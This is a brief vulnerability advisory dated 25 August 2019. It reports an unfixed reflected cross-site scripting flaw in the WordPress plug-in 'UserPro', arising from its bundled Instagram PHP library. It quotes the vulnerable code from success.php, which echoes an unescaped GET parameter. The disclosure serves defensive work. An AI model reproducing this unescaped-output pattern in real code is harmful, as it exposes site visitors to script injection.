The WordPress plug-in &#039;UserPro&#039; uses a Instagram library (Instagram PHP API V2 by cosenary) that
is vulnerable for Reflected Cross-Site Scripting (XSS).

There is more vulnerable code in &#039;UserPro&#039; core, might release that later.

As of today (25 August 2019) this issue is unfixed.

Vulnerable code: (success.php on line 36)

    if (isset($_GET[&#039;error&#039;])) {
        echo &#039;An error occurred: &#039; . $_GET[&#039;error_description&#039;];
    }
